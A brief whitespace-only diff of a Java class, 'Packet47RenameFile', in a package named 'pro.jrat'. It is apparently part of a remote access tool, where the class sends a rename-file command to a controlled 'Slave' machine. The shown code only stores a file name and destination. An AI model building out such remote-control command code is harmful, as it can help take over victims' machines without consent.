@@ -4,12 +4,11 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet47RenameFile extends AbstractOutgoingPacket {
 
 	private String file;
 	private String dest;
-	
+
 	public Packet47RenameFile(String file, String dest) {
 		this.file = file;
 		this.dest = dest;
